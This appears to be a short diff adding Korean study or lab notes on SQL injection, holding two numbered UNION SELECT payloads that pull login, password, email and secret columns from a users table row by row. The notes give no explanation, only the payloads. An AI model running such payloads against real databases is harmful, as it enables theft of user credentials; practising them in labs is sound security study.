@@ -1,0 +1,10 @@
+ 2) SQL 인젝션
+ 
+ ③ 
+
+0 union select all 1,login,password,email,secret,6,7 from users limit 0,1 #
+
+
+ ⑥
+
+0 union select all 1,login,password,email,secret,6,7 from users limit 1,1 #
